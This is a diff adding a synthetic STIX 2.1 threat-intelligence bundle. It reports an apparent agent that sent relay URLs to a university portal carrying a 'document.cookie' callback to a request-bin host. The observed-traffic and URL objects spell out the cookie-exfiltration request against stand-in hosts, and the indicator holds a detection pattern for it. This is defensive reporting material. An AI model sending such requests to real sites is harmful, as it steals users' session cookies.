@@ -1,0 +1,152 @@
+{
+  "type": "bundle",
+  "id": "bundle--5a0c1f0e-0000-4c2a-9a55-3f2e1d0c9b8a",
+  "objects": [
+    {
+      "type": "identity",
+      "spec_version": "2.1",
+      "id": "identity--5a0c1f0e-0001-4c2a-9a55-3f2e1d0c9b8a",
+      "created": "2026-10-09T18:00:00.000Z",
+      "modified": "2026-10-09T18:00:00.000Z",
+      "name": "Example Sensor Network",
+      "identity_class": "organization",
+      "roles": ["sensor operator"],
+      "contact_information": "abuse@sensor.example"
+    },
+    {
+      "type": "report",
+      "spec_version": "2.1",
+      "id": "report--5a0c1f0e-0002-4c2a-9a55-3f2e1d0c9b8a",
+      "created_by_ref": "identity--5a0c1f0e-0001-4c2a-9a55-3f2e1d0c9b8a",
+      "created": "2026-10-09T18:00:00.000Z",
+      "modified": "2026-10-09T18:00:00.000Z",
+      "name": "Synthetic example: callback probes against a university portal",
+      "description": "An agent submitted relay URLs carrying a cookie-dump callback to a request bin, and requested the portal directly.",
+      "published": "2026-10-09T18:00:00.000Z",
+      "report_types": ["threat-report"],
+      "object_refs": [
+        "indicator--5a0c1f0e-0003-4c2a-9a55-3f2e1d0c9b8a",
+        "observed-data--5a0c1f0e-0004-4c2a-9a55-3f2e1d0c9b8a",
+        "sighting--5a0c1f0e-0009-4c2a-9a55-3f2e1d0c9b8a"
+      ],
+      "external_references": [
+        {
+          "source_name": "urlscan.io",
+          "external_id": "0000000c-aaaa-4bbb-8ccc-dddddddddddd",
+          "url": "https://urlscan.io/result/0000000c-aaaa-4bbb-8ccc-dddddddddddd/"
+        },
+        {
+          "source_name": "Wayback Machine",
+          "url": "https://web.archive.org/web/20260901080000/https://relay.example/https://portal.university.example/?c=document.cookie"
+        },
+        {
+          "source_name": "example-csirt-ticket",
+          "external_id": "EX-0042"
+        }
+      ]
+    },
+    {
+      "type": "indicator",
+      "spec_version": "2.1",
+      "id": "indicator--5a0c1f0e-0003-4c2a-9a55-3f2e1d0c9b8a",
+      "created_by_ref": "identity--5a0c1f0e-0001-4c2a-9a55-3f2e1d0c9b8a",
+      "created": "2026-10-09T18:00:00.000Z",
+      "modified": "2026-10-09T18:00:00.000Z",
+      "name": "callback inbox",
+      "pattern": "[url:value = 'https://hooks.callback.example/0b6c1f0e-5555-4c2a-9a55-3f2e1d0c9b8a'] OR [network-traffic:extensions.'http-request-ext'.request_header.'User-Agent' = 'python-requests/2.31']",
+      "pattern_type": "stix",
+      "valid_from": "2026-09-01T08:00:00.000Z",
+      "kill_chain_phases": [
+        { "kill_chain_name": "swarmchasing-sc-t", "phase_name": "callback-channels" }
+      ],
+      "external_references": [
+        { "source_name": "swarmchasing-sc-t", "external_id": "SC-T7" },
+        { "source_name": "mitre-attack", "external_id": "T1567" }
+      ]
+    },
+    {
+      "type": "observed-data",
+      "spec_version": "2.1",
+      "id": "observed-data--5a0c1f0e-0004-4c2a-9a55-3f2e1d0c9b8a",
+      "created_by_ref": "identity--5a0c1f0e-0001-4c2a-9a55-3f2e1d0c9b8a",
+      "created": "2026-10-09T18:00:00.000Z",
+      "modified": "2026-10-09T18:00:00.000Z",
+      "first_observed": "2026-09-01T08:00:00.000Z",
+      "last_observed": "2026-09-02T09:30:00.000Z",
+      "number_observed": 3,
+      "object_refs": [
+        "network-traffic--5a0c1f0e-0005-4c2a-9a55-3f2e1d0c9b8a",
+        "url--5a0c1f0e-0008-4c2a-9a55-3f2e1d0c9b8a"
+      ]
+    },
+    {
+      "type": "network-traffic",
+      "spec_version": "2.1",
+      "id": "network-traffic--5a0c1f0e-0005-4c2a-9a55-3f2e1d0c9b8a",
+      "src_ref": "ipv4-addr--5a0c1f0e-0006-4c2a-9a55-3f2e1d0c9b8a",
+      "dst_ref": "domain-name--5a0c1f0e-0007-4c2a-9a55-3f2e1d0c9b8a",
+      "dst_port": 443,
+      "protocols": ["tcp", "http"],
+      "extensions": {
+        "http-request-ext": {
+          "request_method": "GET",
+          "request_value": "/?c=document.cookie&cb=https://hooks.callback.example/0b6c1f0e-5555-4c2a-9a55-3f2e1d0c9b8a",
+          "request_header": {
+            "Host": "portal.university.example",
+            "User-Agent": "python-requests/2.31"
+          }
+        }
+      }
+    },
+    {
+      "type": "ipv4-addr",
+      "spec_version": "2.1",
+      "id": "ipv4-addr--5a0c1f0e-0006-4c2a-9a55-3f2e1d0c9b8a",
+      "value": "203.0.113.9"
+    },
+    {
+      "type": "domain-name",
+      "spec_version": "2.1",
+      "id": "domain-name--5a0c1f0e-0007-4c2a-9a55-3f2e1d0c9b8a",
+      "value": "portal.university.example"
+    },
+    {
+      "type": "url",
+      "spec_version": "2.1",
+      "id": "url--5a0c1f0e-0008-4c2a-9a55-3f2e1d0c9b8a",
+      "value": "https://relay.example/https://portal.university.example/?c=document.cookie"
+    },
+    {
+      "type": "sighting",
+      "spec_version": "2.1",
+      "id": "sighting--5a0c1f0e-0009-4c2a-9a55-3f2e1d0c9b8a",
+      "created_by_ref": "identity--5a0c1f0e-0001-4c2a-9a55-3f2e1d0c9b8a",
+      "created": "2026-10-09T18:00:00.000Z",
+      "modified": "2026-10-09T18:00:00.000Z",
+      "first_seen": "2026-09-01T08:00:00.000Z",
+      "last_seen": "2026-09-02T09:30:00.000Z",
+      "count": 3,
+      "sighting_of_ref": "indicator--5a0c1f0e-0003-4c2a-9a55-3f2e1d0c9b8a",
+      "observed_data_refs": ["observed-data--5a0c1f0e-0004-4c2a-9a55-3f2e1d0c9b8a"],
+      "where_sighted_refs": ["identity--5a0c1f0e-0001-4c2a-9a55-3f2e1d0c9b8a"]
+    },
+    {
+      "type": "attack-pattern",
+      "spec_version": "2.1",
+      "id": "attack-pattern--5a0c1f0e-0010-4c2a-9a55-3f2e1d0c9b8a",
+      "created": "2026-10-09T18:00:00.000Z",
+      "modified": "2026-10-09T18:00:00.000Z",
+      "name": "Cookie dump through a relay"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--5a0c1f0e-0011-4c2a-9a55-3f2e1d0c9b8a",
+      "created": "2026-10-09T18:00:00.000Z",
+      "modified": "2026-10-09T18:00:00.000Z",
+      "relationship_type": "indicates",
+      "source_ref": "indicator--5a0c1f0e-0003-4c2a-9a55-3f2e1d0c9b8a",
+      "target_ref": "attack-pattern--5a0c1f0e-0010-4c2a-9a55-3f2e1d0c9b8a"
+    }
+  ]
+}
